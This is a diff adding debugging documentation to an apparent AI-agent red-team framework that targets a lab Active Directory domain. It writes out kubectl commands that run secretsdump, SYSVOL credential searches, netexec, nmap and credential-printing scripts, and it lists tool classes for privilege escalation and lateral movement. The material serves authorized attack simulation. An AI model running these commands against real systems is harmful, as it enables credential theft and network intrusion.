@@ -470,6 +470,138 @@ When any agent discovers a credential:
 3. **Hold onto results**
    - Results should be reported immediately for broadcast
 
+## Debugging and Manual Testing
+
+### Manually Running Tools on Agent Pods
+
+For debugging or testing specific tools, you can exec into a worker pod and run
+tools directly without going through the orchestrator dispatch system.
+
+#### Method 1: Direct Python Tool Invocation
+
+Exec into the appropriate agent pod and call the tool class directly:
+
+```bash
+# Run SYSVOL script search on credential-access agent
+kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- python -c "
+from ares.tools.red import SharePilferingTools
+tools = SharePilferingTools()
+result = tools.sysvol_script_search(
+    target='10.1.2.240',
+    username='samwell.tarly',
+    password='Heartsbane',  # pragma: allowlist secret
+    domain='north.sevenkingdoms.local'
+)
+print(result)
+"
+
+# Run secretsdump on credential-access agent
+kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- python -c "
+from ares.tools.red import CredentialHarvestingTools
+tools = CredentialHarvestingTools()
+result = tools.secretsdump(
+    target='10.1.2.240',
+    username='administrator',
+    password='AdminPass123',  # pragma: allowlist secret
+    domain='north.sevenkingdoms.local'
+)
+print(result)
+"
+
+# Run nmap scan on recon agent
+kubectl -n attack-simulation exec -it ares-recon-agent-0 -- python -c "
+from ares.tools.red import NetworkEnumerationTools
+tools = NetworkEnumerationTools()
+result = tools.nmap_scan(target='10.1.2.0/24', scan_type='quick')
+print(result)
+"
+```
+
+#### Method 2: Direct Shell Command
+
+Run the underlying tool binaries directly:
+
+```bash
+# Run smbclient directly
+kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- \
+    smbclient '//10.1.2.240/SYSVOL' -U 'DOMAIN/user%password' -c 'ls'
+
+# Run netexec directly
+kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- \
+    netexec smb 10.1.2.240 -u 'user' -p 'password' -d 'DOMAIN' --shares
+
+# Run secretsdump directly
+kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- \
+    secretsdump.py 'DOMAIN/user:password@10.1.2.240'
+```
+
+#### Available Tool Classes by Agent
+
+| Agent Pod | Tool Classes |
+| --------- | ------------ |
+| `ares-recon-agent-*` | `NetworkEnumerationTools`, `BloodHoundTools` |
+| `ares-credential-access-agent-*` | `CredentialDiscoveryTools`, `CredentialHarvestingTools`, `SharePilferingTools` |
+| `ares-cracker-agent-*` | `CrackingTools` |
+| `ares-acl-agent-*` | `ACLExploitTools` |
+| `ares-privesc-agent-*` | `CertipyTools`, `DelegationTools`, `MSSQLTools`, `CVEExploitTools` |
+| `ares-lateral-movement-agent-*` | `LateralMovementTools`, `CredentialHarvestingTools` |
+| `ares-coercion-agent-*` | `CoercionTools`, `CoercionNetworkTools` |
+
+#### Importing Tool Classes
+
+All red team tools can be imported from `ares.tools.red`:
+
+```python
+from ares.tools.red import (
+    NetworkEnumerationTools,
+    BloodHoundTools,
+    CredentialDiscoveryTools,
+    CredentialHarvestingTools,
+    SharePilferingTools,
+    CrackingTools,
+    ACLExploitTools,
+    CertipyTools,
+    DelegationTools,
+    MSSQLTools,
+    LateralMovementTools,
+    CoercionTools,
+)
+```
+
+#### Testing with State
+
+To test tools that need shared state (for credential resolution or result
+reporting):
+
+```python
+kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- python -c "
+from ares.core.models import SharedRedTeamState, Target
+from ares.tools.red import SharePilferingTools
+
+# Create minimal state
+state = SharedRedTeamState(operation_id='test-op')
+state.target = Target(ip='10.1.2.240', hostname='winterfell', domain='north.sevenkingdoms.local')
+
+# Initialize tools with state
+tools = SharePilferingTools()
+tools.set_state(state)
+
+# Run tool - credentials found will be added to state
+result = tools.sysvol_script_search(
+    target='10.1.2.240',
+    username='samwell.tarly',
+    password='Heartsbane',  # pragma: allowlist secret
+    domain='north.sevenkingdoms.local'
+)
+print(result)
+
+# Check if any credentials were extracted
+print(f'Credentials found: {len(state.all_credentials)}')
+for cred in state.all_credentials:
+    print(f'  {cred.domain}\\\\{cred.username}: {cred.password}')
+"
+```
+
 ## File Reference
 
 - `src/ares/core/orchestrator.py` - Main orchestrator coordination engine
